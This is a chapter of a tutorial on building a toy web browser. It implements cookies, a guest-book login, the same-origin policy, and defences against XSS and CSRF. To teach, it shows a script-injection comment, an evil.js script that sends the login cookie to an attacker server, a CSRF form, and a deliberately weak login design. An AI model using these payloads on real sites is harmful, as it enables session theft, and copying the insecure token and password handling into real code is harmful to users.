---
title: Keeping Data Private
chapter: 11
prev: reflow
...

What a journey the [last ten posts](index.md) have been! We\'ve built a
minimal web browser, starting from [networking](http.md) all the way to
[efficiently](reflow.md) [executing JavaScript](scripts.md). While the
browser we\'ve written isn\'t exactly usable for large web applications,
it shows the core of how browsers work. But running rich web
applications carries its own downsides: our browser is now responsible
for securing important user data, and now has adversaries with financial
interests in getting at that data. In this post, we\'ll implement the
most basic kind of user data---cookies---and the basic browser security
policy that protects that data.

::: {.warning}
Web browser security is a vast topic. It involves securing the web
browser, securing the network, and securing the applications that the
browser runs. It also involves educating the user, so that attackers
can\'t misleading them into revealing their own secure data. This post
can\'t cover all of that. Instead, it focuses on the mechanisms browsers
have developed to protect the security of web applications. *So*, if
you\'re writing security-sensitive code, this blog post is not enough.
:::

Cookies
=======

The most basic kind of user data on the web is the *cookie*. A
cookie---the name is kind of meaningless, so ignore it---is a little bit
of information stored by your browser on behalf of a web server. It\'s
that information that allows the server to distinguish one web request
from another. Bereft of cookies, your web browser is effectively
anonymous:[^1] it isn\'t logged in anywhere so it can\'t do anything
useful.

Here\'s how cookies work. A web server, when it sends you an HTTP
response, can send a `Set-Cookie` header. This header contains a
key-value pair, plus a bunch of parameters describing how long the
cookie should be stored and who it should be shown to. For example, the
following `Set-Cookie` header sets the value of the `foo` key to `bar`
and saves it until 2020:

``` {.example}
Set-Cookie: foo=bar; expires=Wed, 1 Jan 2020 00:00:00 GMT
```

The expiration date is not mandatory, and there are other parameters you
could add to a cookie, but for now let\'s focus just on the key-value
pair involved. That\'s what your browser needs to remember: that `foo`
is `bar`. Every time it visits the server again it tells the server that
`foo=bar` using the `Cookie` header:

``` {.example}
Cookie: foo=bar; baz=quux
```

To be clear, this `Cookie` header is reporting two cookies, with names
`foo` and `baz`. Parameters like expiration dates are not reported to
the server.

Let\'s implement cookies.

We\'ll start by adding a field to our `Browser` to store cookies; this
is traditionally called a *cookie jar*,[^2] which I\'m going to shorten
to just `jar`:

``` {.python}
class Browser:
    def __init__(self):
        # ...
        self.jar = {}
```

Then, when responses are processed (in both `browse` and `post`):

``` {.python}
if "set-cookie" in headers:
    kv, *params = headers["set-cookie"].split(";")
    key, value = kv.split("=", 1)
    self.jar[key] = value
```

I\'m ignoring expiration and so on, and I\'m also ignoring the fact that
a server can actually send multiple `Set-Cookie` headers to set multiple
cookies. It\'s a toy browser, people! I\'m also storing all the cookies,
from all of the servers, in one place. This is stupid, but we\'ll fix it
later, don\'t worry! For now, think of this as a one-server browser.

Finally, we need to send the `Cookie` header with all of the current
cookies. Let\'s add a `headers` argument to the `request` function to do
this:

``` {.python}
def request(method, host, port, path, headers={}, body=None):
    # ...
    for header, value in headers.items():
        s.send("{}: {}\r\n".format(header, value).encode("utf8"))
    # ...
```

Now we can update the uses of `request` in `browse` and `post` to
construct a headers dictionary:

``` {.python}
cookie_string = ""
for key, value in self.jar.items():
    cookie_string += "&" + key + "=" + value
req_headers = { "Cookie": cookie_string[1:] }
headers, body = request("GET", host, port, path, headers=req_headers)
```

Let\'s use this cookie system to add logins to our guest book.

A login system
==============

As a simple example, let\'s require that users log in before posting to
the guest book. I don\'t want to build a whole, complex login system,
but here\'s some minimal functionality I\'ll be implementing:

-   The server will have a hard-coded list of usernames and passwords
-   There will be a `/login` page on the server where you\'ll have to
    enter a username and password
-   You have to be logged in to add guest book entries
-   The server will remember who made which comment and display that

Let\'s start coding. First, we\'ll need to change the `ENTRIES` data
structure to add a username to each:[^3]

``` {.python}
ENTRIES = [ ("Mess with the best, die like the rest", "crashoverride"), ("HACK THE PLANET!!!", "nameless") ]
```

We\'ll also need a data structure to store usernames and passwords:

``` {.python}
LOGINS = { "crashoverride": "0cool", "nameless": "cerealkiller" }
```

Next, let\'s add the `/login` URL:

``` {.python}
if url == "/login":
    body = "<!doctype html>"
    body += "<form action=/ method=post>"
    body += "<p>Username: <input name=username></p>"
    body += "<p>Password: <input name=password type=password></p>"
    body += "<p><button>Log in</button></p>"
    body += "</form>"
    return body
```

To use the form, the user goes to `/login`, fills out their details,
submits the form, and is redirected back to the main page (that\'s
\"`action=/`\").[^4]

When the server received a login request like this, it should log the
user in, which I\'m going to implement directly in `handle_request`:

``` {.python}
username = None
if method == "post" and url == "/":
    params = form_decode(body)
    if check_login(params.get("username"), params.get("password")):
        username = params["username"]
        out += "<p class=success>Logged in as {}</p>".format(username)
    else:
        out += "<p class=errors>Login failed!</p>"
```

The `check_login` method does exactly what you\'d expect:

``` {.python}
def check_login(username, pw):
    return username in LOGINS and LOGINS[username] == pw
```

The server now checks that the login was correct, but it should also set
a cookie so that the browser actually remembers the login:[^5]

``` {.python}
resp_headers = {}

if method == "post" and url = "/":
    # ...
    if check_login(params.get("username"), params.get("password")):
        # ...
        resp_headers["Set-Cookie"] = "username=" + username
# ...

return out, resp_headers
```

We\'ll modify the `handle_connection` method to use the returned
headers:

``` {.python}
response, headers = handle_request(method, url, headers, body)
# ...
for header, value in headers.items():
    conx.send("{}: {}\r\n".format(header, value).encode('utf8'))
```

Since we\'re now setting cookies we should also be reading them:

``` {.python}
if "cookie" in headers:
    username = parse_cookies(headers["cookie"]).get("username")
```

Here `parse_cookies` just does the semicolon-and-equal-sign split:[^6]

``` {.python}
def parse_cookies(s):
    out = {}
    for cookie in s.split(";"):
        k, v = cookie.strip().split("=", 1)
        out[k] = v
    return out
```

That will log a user in if they have the right cookie. Now we need to
make some changes to the existing guest book code to handle logins.

We can use the `username` variable to either send the user the new guest
book entry form or to give them a login link:

``` {.python}
if username:
    out += # form ...
else:
    out += "<p><a href=/login>Log in to add to the guest list</a></p>"
```

We now have two types of POST requests: one to post a new guest book
entry and one to log in. We\'ll distinguish them by URL, so make sure
that posting to the guest book uses the condition

``` {.python}
if method == "POST" and url == "/add":
    # ...
```

Also, when you post to the guest book, we\'ll need to know your
username:

``` {.python}
if 'guest' in params and len(params['guest']) <= 100 and username:
    ENTRIES.append((params['guest'], username))
```

We aren\'t showing the new guest book entry form to users who aren\'t
logged in, but we still need to check `username` here, for the same
reason that we need to check the length of entries on both the client
and the server side: malicious users could construct their own POST
requests without first filling out the form in a browser.

Finally, when we print the guest book entries, we\'ll print the username
as well:

``` {.python}
for entry, who in ENTRIES:
    out += '<p>' + entry + " <i>from " + who + '</i></p>'
```

Try it out! You should be able to go to the main guest book page, click
the link to log in, use one of the username/password pairs above, and
post entries.

Of course, the code above has a whole slew of insecurities. It\'s hard
to cover all of them,[^7] but let\'s cover three of the most glaring
ones.

Changing your login
===================

Right now, the cookie just stores your username. It\'s not hard to
change! Let\'s go back to our browser and hard-code the cookie value:

``` {.python}
self.jar["username"] = "nameless"
```

Now if you start up your browser and point it at the main page, you
should see the entry form, even though you never had to enter a login.
How absurdly insecure!

The solution to this is to not store the username directly in the
browser, where it can be changed by the user. Instead, let\'s store a
\"login token\", a random value that is hard to guess, and have the
server remember which login token is for which username.

This is actually standard practice not just for security reasons but
also for functional ones. Generally speaking, cookie names and values
must be pretty short, though there isn\'t a fixed limit across all
browsers.[^8] So cookies don\'t usually store *data*; they store
*references* to data that the server has stored elsewhere. Using a
reference means that you can store as much data as you want on the
server without growing the size of the cookie.

Let\'s add login tokens in our guest book. I\'ll store the tokens in a
global variable:

``` {.python}
import random
TOKENS = {}
```

Then where we set `Set-Cookie` we\'ll create a new token and remember
its username:

``` {.python}
token = str(random.random())[2:]
TOKENS[token] = username
headers["Set-Cookie"] = "token=" + token
```

Then when we read the `Cookie` header, we\'ll use the token to retrieve
the username:

``` {.python}
if "cookie" in headers:
    username = TOKENS.get(parse_cookies(headers["cookie"]).get("token"))
```

As long as the tokens are hard to guess,[^9] the only way to get one is
from the server, and the server will only give you one with a valid
login.

The same-origin policy
======================

Our browser does not keep our precious cookie safe. Right now, we have a
single cookie jar in our browser, and every cookie from any website is
sent to all other websites. This means that if you log in on our guest
book, and then make a request to the `attack.evil` website, that website
can see the token in the headers, record it, set its own browser cookie
to your token, and then post as you on the guest book website. You see,
cookies are web-site specific, but we\'re not storing them that way. It
goes beyond security---if you have two servers that both set the `token`
cookie, they\'d overwrite each other and you\'d constantly be getting
logged out!

Web browsers use the *same origin policy* to determine which cookies are
sent where. The rule is: if a cookie is set on one origin---where the
origin is the scheme, host, and port---it can only be sent to servers on
the same origin. Let\'s update our cookie policy to do this. I\'ll
change the `jar` field so it stores a map from origins to key-value
pairs:[^10]

``` {.python}
if "set-cookie" in headers:
    kv, params = headers["set-cookie"].split(";")
    key, value = kv.split("=", 1)
    origin = (host, port)
    self.jar.setdefault(origin, {})[key] = value
```

Then, when generating the `Cookie` header, instead of using
`self.jar.items()`, we\'ll use a `cookies` dictionary defined like this:

``` {.python}
host, port, path = parse_url(self.history[-1])
cookies = self.jar.get((host, port), {})
```

Now it\'s not quite so easy for a rogue web server to steal our cookies.
It\'d have to be on the same origin, and that can\'t happen, because
this origin is already occupied up by *this* server.

Right?

Cross-site scripting
====================

Sure, the origin is uniquely owned by our web server, so there\'s no way
some other web server could see the headers the server and browser send
to each other.[^11][^12][^13][^14]

But that\'s not the only way to read cookies! In fact, cookies are
accessible from JavaScript as well, through the `document.cookie` field.
This field is a string, containing the same contents as the `Cookie`
header value. We can implement that pretty simply. First, in
`runtime.js`:

``` {.javascript}
Object.defineProperty(document, 'cookie', {
    get: function() { return call_python("cookie"); }
})
```

Now we register `cookie` to a simple function that returns the cookie
value:

``` {.python}
class Browser:
    def parse(self):
        # ...
        self.js.export_function("cookie", self.js_cookie)

    def js_cookie(self):
        host, port, path = parse_url(self.history[-1])
        cookies = self.jar.get((host, port), {})

        cookie_string = ""
        for key, value in cookies.items():
            cookie_string += "&" + key + "=" + value
        return cookie_string[1:]
```

Accessing cookies from JavaScript may seem benign, since the JavaScript
being run, in `comment.js`, is our own and won\'t do anything malicious.
And this is true, if users are well-behaved. But consider the code we
wrote to output guest book entries:

``` {.python}
out += '<p>' + entry + ' <i> by ' + username + '</i></p>'
```

Note that `entry` can be anything, anything the user might stick into
our comment form. \"Anything\" might even include a user-written
`<script>` tag! Let\'s imagine that you\'re logged in as one user, maybe
`crashoverride`, but would like to gain access to another username,
maybe `nameless`. You could post the comment:

``` {.example}
Hi! <script src=http://my-server/evil.js></script>
```

Our server would then output the HTML:[^15]

``` {.example}
<p>Hi! <script src=http://my-server/evil.js></script> <i> by crashoverride</i></p>
```

That would cause our browser to download the `evil.js` script.[^16] So
`evil.js` could access `document.cookie` and do something evil.

Let\'s try it out. Post the above comment, except instead of `my-server`
use `localhost:9000`. We can create a server on `localhost:9000` with
this command:

``` {.example}
python3 -m http.server 9000
```

That uses Python\'s built-in HTTP server to respond to
`localhost:9000/file` with the contents of the file `file` in the
current directory. Let\'s fill `evil.js` with the following contents:

``` {.javascript}
token = document.cookie.split("=")[1]
body = document.querySelectorAll("body")[0]
body.innerHTML = "<a href=http://localhost:9000/" + token + ">Click here to continue</a>"
```

That replaces the whole web page with a single link. When the user
clicks that link,[^17] their browser navigates to a page on our evil web
server that encodes our token. Our evil server could just record that
and then redirect them back to the guest book. In a more feature-full
browser this could be more transparent. The attacker could make an
`XMLHttpRequest`,[^18] add an image to the page that the browser will
try to load (from our evil server), load JavaScript from our evil
domain, or anything else like that. Even with the extremely limited DOM
API our browser supports, we could better hide our evildoing:

``` {.javascript}
form = document.querySelectorAll("form")
newform = "<form action=http://localhost:9000/" + token + " method=get>"
newform += "<p><input name=guest></p><p><button>Sign the book!</button></p>"
newform += "</form>"
form.innerHTML= newform
```

This replaces the contents of the comment form with a new form (so it\'s
a form in a form, with the inner form taking priority) that submits both
the new comments and the login token to our evil server.

Try some of these exploits out, either in our limited browser or in a
real one.

The core problem behind these problems is that user comments are
supposed to be data, but the browser is interpreting them as code. This
kind of exploit is usually called *cross-site scripting*, shortened to
XSS, though the data-misinterpreted-as-code issue is a fairly broad one
that occurs in many, many systems.

Anyway, whatever it\'s called, we need to fix it, and the way we do that
is not sending `entry`, the user comment, directly to the browser.
Instead, we\'d do something to ensure the browser would not interpret it
as code, something like:

``` {.python}
entry = entry.replace("&", "&amp;").replace("<", "&lt;")
out += # ...
```

Now the comment would would be printed as the code `&lt;script`, instead
of as a literal script tag, so the browser will interpret it as text,
not a tag.[^19] So we\'ve definitely fixed the problem of the browser
running code based on user comments. Success!

I should add that there are other approaches to this bug. You could
remove tags instead of escaping the angle bracket. You could prevent
users from submitting comments with \"invalid characters\". You could do
the character replacing before saving the entry, instead of before
showing the entry. These are all worse than escaping:

-   Removing tags means you must match all of the quirky ways browsers
    interpret malformed tags
-   Prevent users from submitting comments has the same issue, plus you
    need to make sure that check is the same on the server and the
    client side. Plus, you might write too tight a filter and prevent
    users from sending something benign, like old-school heart emoticons
    `<3`.
-   Saving the character-replaced entry assumes you\'ll only consume the
    entry in HTML; what if you later need to put it into JSON (you\'ll
    need to escape single quotes), or raw JavaScript (you\'ll need to
    escape `</script>`), or JSON embedded in JavaScript embedded in
    HTML. Data should be a single source of truth, not a place to store
    mangled HTML

You might want to escape some more characters, like replacing double
quotes with `&quot;` if you plan to stick user data into HTML
attributes, but the method above is roughly correct in general concept.

Cross-site request forgery
==========================

Thanks to the same-origin policy and the mitigations for cross-site
scripting, it\'s now hard for an evil-doer to steal the login token from
our browser. But that doesn\'t leave us totally safe. Another concern is
our browser being confused into misusing the tokens it already has. One
popular exploit of this type is called *cross-site request forgery*,
often shortened to CSRF.

In cross-site request forgery, the attack does not involve the user
going to our guest book site at all. Instead, the user begins on our
evil-doer\'s website.[^20] That website has a form analogous to the
guest-book form:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><input name=guest></p>
  <p><button>Sign the book!</button></p>
</form>
```

Our browser (and real browsers) do not care what origin a form is on:
you can submit a form on one origin to another origin, and this ability
is widely used for some reason.[^21] So even if the user fills out this
form on the evil website, the form is still be submitted to the
guest-book. When the browser makes that POST request to the guest-book,
it will *also* send along its guest-book cookie. Since the user has no
idea where a form is going---the browser does not show them that
information---they might want to sign a guest book on the evil-doer\'s
site and end up signing the one on our server instead.

But it gets worse! Suppose the form isn\'t actually like that, and
instead looks like this:

``` {.html}
<form action=http://localhost:8000/add method=post>
  <p><button>Click me!</button></p>
</form>
```

People will do all sorts of stuff, so they might click that button. And
it may look safe, since there\'s no `guest` input area. However, there
might be some sneaky JavaScript attached:

``` {.javascript}
form  = document.querySelectorAll('form')[0]
form.addEventListener("submit", function() {
    comment = "Buy from my website: http://evil.doer/";
    input = "<input name=guest value=\"" + comment + "\">";
    form.innerHTML = input;
})
```

This JavaScript waits for the user to click the button, and then
replaces the form contents with a `guest` input area with a pre-filled
value. The browser then finds it when it looks for input areas and
submits our hard-coded guest-book entry to the guest-book server. And
remember: the form is submitted by the user\'s browser, with the user\'s
cookies, so the post will succeed (if the user is logged in to the guest
book). Posting this sort of comment might not seem too scary (though
shady advertisers will pay for it!) but imagine someone doing the same
with a bank transaction.

Try it! This should work in both ours and in a real browser. Plus, in a
real browser you could also have a \"hidden\" input element, which would
mean that you don\'t need to write any tricky JavaScript at all.

How do we defend against this attack?

We want to make sure that every POST request to `/add` comes from a form
on our website. The normal way to ensure that is to embed a secret
value, called a *nonce*, into the form, and to reject form submissions
that don\'t come with this secret value. The nonce is like a login
token, but instead of getting it on login, you get a new one every time
you\'re presented with a form to fill out.

Let\'s implement nonces in our guest book. First, we\'ll generate our
secret nonce:

``` {.python}
nonce = str(random.random())[2:]
```

Next, we\'ll add it to our form, like this:

``` {.python}
out += "<input name=nonce type=hidden value=" + nonce + ">"
```

The `hidden` input type basically instructs a browser not to render the
input area, but to still submit it in the form. In our browser, which
doesn\'t support hidden input elements, this will show up as an input
area with a random string of digits---not ideal, but as long as you
don\'t touch it form submission will work fine.

We\'ll also need to save the nonce so that we can tell valid from
invalid nonces. I\'m going to store that in a `NONCE` variable, which
will store one nonce per user. We\'ll then check both that the nonce is
valid and also that it is associated with the correct user:[^22]

``` {.python}
NONCES[username] = nonce
```

When the form is submitted, we will check the nonce:

``` {.python}
if 'nonce' in params and params['nonce'] == NONCES.get(username) and # ...
```

Thanks to this change, in order to add an entry to the guest book, you
need to be logged in and submit the form on the guest book page itself.
And that\'s a form that we, as the guest book authors, have sole control
over (thanks to our XSS mitigations), so the form submission has now
been secured. Or... I keep saying there\'s more to security than what\'s
in this post. Let\'s just settle for this fact: the guest book is now
more secure than before this post.

::: {.warning}
The purpose of this post is to teach the *internals of web browsers*,
not to teach web application security. There\'s much more you\'d want to
do to make this guest book truly secure, let alone what we\'d need to do
to avoid denial of service attacks or to handle spam and malicious use.
And of course we didn\'t say anything about encryption and evesdropping
for the browser-server connection itself, which is essential for
preserving user privacy. But that\'s a different series, and I\'ll have
to leave security here.
:::

Summary
=======

We\'ve added user data, in the form of cookies, to our browser, and
immediately had to bear the heavy burden of securing that data and
ensuring it was not misused. But with some simple tweaks to our web
server, we\'ve prevented the most common web application
vulnerabilities, and seen how the browser capabilities we developed to
build rich applications also enabled these attacks.

Exercises
=========

-   Add support for hidden input elements. Since they don\'t need to be
    laid out, there\'s no need for a layout type at all!
-   Add support for cookie expiration. Cookie expiration dates are set
    in the `Set-Cookie` header, and can be overwritten if the same
    cookie is set again with a later date. Save the same expiration
    dates in the `TOKENS` variable and use it to delete old tokens to
    save memory.
-   Add support for cookie origins. Due to the same-origin policy, a
    cookie set by `mail.google.com` cannot be read by, say,
    `calendar.google.com`, because the host name is the same. This is a
    good default,[^23] but is sometimes annoying. Cookies can thus set
    an origin parameter in the `Set-Cookie` header, changing their
    origin to a more general domain (stripping off some subdomains).
    Implement this in your browser, making sure to send these
    generalized-origin cookies on any requests covered by the
    generalized origin.
-   The `Content-Security-Policy` header is a very powerful tool modern
    browsers have developed to prevent XSS attacks. The full
    specification is quite complex, but in the simplest use case, the
    server sends this header with a value of the form
    `default-src http://domain1/ http://domain2/ ...`. The word
    `default-src` is a keyword; the URLs gives a scheme, a host, and a
    port. When the browser receives that header, it must refuse to load
    any additional resources for that page (CSS, JavaScript, images, and
    so on) unless they are on one of the given scheme/host/ports.
    Implement support for this header.
-   When your browser visits a web page, or when it loads a CSS or
    JavaScript file, it sends a `Referer` header[^24] containing the URL
    it is coming from. Sites often use this for analytics. However, for
    some servers, the URL contains meaningful data that they don\'t want
    revealed to other websites. For these cases there is a
    `Referer-Policy` header, which can contain values like `no-referer`
    (never send the `Referer` header when leaving this page) or
    `same-origin` (only do so if navigating to another page on the same
    origin). There are other values too, but let\'s ignore them.
    Implement both the `Referer` header and the `Referer-Policy` header,
    with those two values supported.

[^1]: I don\'t mean anonymous against malicious attackers, who might use
    *browser fingerprinting* or similar techniques to tell different
    users apart. But anonymous in the good-faith sense.

[^2]: Because once you have one silly name it\'s important to stay
    on-brand.

[^3]: The seed comments are a reference to *Hackers*, and movie from the
    90s. It felt thematically appropriate to this post, don\'t you
    think?

[^4]: I\'ve given the `password` input area the type `password`, which
    in a real browser will draw stars instead of showing what you\'ve
    entered, though our browser doesn\'t do that.

[^5]: Like with the cookie jar, this is a transparently insecure design,
    on purpose, so that I can demonstrate an attack.

[^6]: In reality there\'s also special syntax if you want an equal sign
    in your cookie, but I\'m ignoring that.

[^7]: We should be hashing passwords! Using `bcrypt`! We should verify
    email addresses! We should be comparing passwords in a constant-time
    fashion!

[^8]: Also, cookies are sent back and forth on every request, and long
    cookies would mean a lot of useless traffic.

[^9]: They\'re roughly-16-digit decimal numbers, so 53 bits of
    randomness, which isn\'t great but isn\'t terrible (in real code go
    for 256), but `random.random` is not a secure random number
    generator, which you\'d need to use to prevent attacks. Observing
    enough tokens, an attacker could predict future values produced by
    `random.random`. That\'s one of the security exploits I\'m going to
    ignore here, even though it is real and important.

[^10]: Our browser only supports one scheme, `http`, so I\'m not
    including that in the origin.

[^11]: Well... Our connection isn\'t encrypted, so an attacker could
    pick up the token from there. But another *server* couldn\'t.

[^12]: Well... Another server could hijack our DNS and redirect our
    hostname to a different IP address, and then steal our cookies. But
    some ISPs support DNSSEC, which prevents that.

[^13]: Well... A state-level attacker could announce fradulent BGP
    routes, which would send even a correctly-retrieved IP address to
    the wrong physical computer.

[^14]: Security is very hard.

[^15]: Yes, our form-encoding is very very limited, but it\'s similarly
    limited on both browser and server, so you could post the above
    comment using our browser. In a real browser this would also work,
    and in a less accidental way.

[^16]: Yes: real browsers, just like our toy browser, will download and
    run JavaScript from any source, including from other servers and
    origins, and they all run with the same permissions. This is
    important for enabling common shared libraries.

[^17]: They probably will, most users arent\' security experts.

[^18]: Nowadays, scripts aren\'t allowed to read data from XHRs to
    another origin, but the browser still makes the request, in case the
    server uses a CORS header to allow it.

[^19]: In a real browser, that code will be displayed as a literal
    less-than sign followed by the word `script`, but in our browser,
    this won\'t happen, unless you did the relevant exercise in [post
    4](html.md).

[^20]: Why? Perhaps it has some good content too, perhaps the site has
    been hacked and is being used for the attack against its will, or
    perhaps the evil-doer paid for ads on sketchy websites where users
    have low standards for security anyway.

[^21]: For example, search forms that actually just direct you to a
    Google search.

[^22]: You wouldn\'t want an attacker to take a nonce for *their*
    account and then use in a CSRF attack.

[^23]: Should `microsoft.com` read `google.com`? What about
    `microsoft.co.uk` and `google.co.uk`?

[^24]: Yep, spelled that way.
